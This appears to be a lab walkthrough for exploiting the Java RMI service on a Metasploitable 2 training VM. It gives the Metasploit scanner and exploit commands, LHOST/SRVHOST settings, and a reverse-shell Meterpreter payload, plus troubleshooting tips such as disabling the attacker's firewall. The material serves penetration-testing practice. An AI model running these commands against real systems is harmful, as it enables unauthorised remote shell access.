
#### 🔎 Detection (Scanner)

Module: `auxiliary/scanner/misc/java_rmi_server`

```text
use auxiliary/scanner/misc/java_rmi_server
set RHOSTS 192.168.56.109
set RPORT 1099
run
```

**Result:**

- Confirms Java RMI endpoint is running.
    
- Shows: `Class Loader Enabled` → indicates exploitable remote class loading.
    

---

#### 💥 Exploitation

Module: `exploit/multi/misc/java_rmi_server`

```text
use exploit/multi/misc/java_rmi_server
set RHOSTS 192.168.56.109
set RPORT 1099

# Set attacker IP on same network as target (Host-Only network, e.g. 192.168.56.x)
set LHOST 192.168.56.<your_ip>
set SRVHOST 192.168.56.<your_ip>

# Payload choice
set PAYLOAD java/meterpreter/reverse_tcp
# Alternative simpler payloads if Java meterpreter fails
# set PAYLOAD cmd/unix/reverse

run
```

---

#### ⚠️ Common Issues & Fixes

- **Error: "The RMI class loader couldn't find the payload"**
    
    - Happens if SRVHOST/LHOST are bound to wrong adapter (e.g., NAT 10.x instead of Host-Only 192.168.56.x).
        
    - ✅ Fix: Ensure both `SRVHOST` and `LHOST` are set to your 192.168.56.x IP.
        
- **Firewall blocking port 8080**
    
    - Metasploit uses a local webserver to host payload.
        
    - ✅ Fix: Allow or disable firewall temporarily on attacker.
        

---

#### ✅ Summary

1. **Scan** with `auxiliary/scanner/misc/java_rmi_server` → confirm `Class Loader Enabled`.
    
2. **Exploit** with `exploit/multi/misc/java_rmi_server`, correct LHOST/SRVHOST.
    
3. **Result**: Reverse shell or meterpreter session on Metasploitable 2.